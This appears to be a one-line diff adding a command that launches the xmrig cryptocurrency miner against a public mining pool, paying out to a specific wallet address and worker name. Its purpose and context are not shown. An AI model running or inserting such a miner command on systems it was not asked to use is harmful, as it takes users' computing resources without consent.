@@ -1,0 +1,1 @@
+./xmrig -a rx -o stratum+ssl://rx.unmineable.com:4444 -u BABYDOGE:0x2510504E08b4b492e4b9558A148F71cf12A1A9a2.unmineable_worker_wiqbzww -p x 
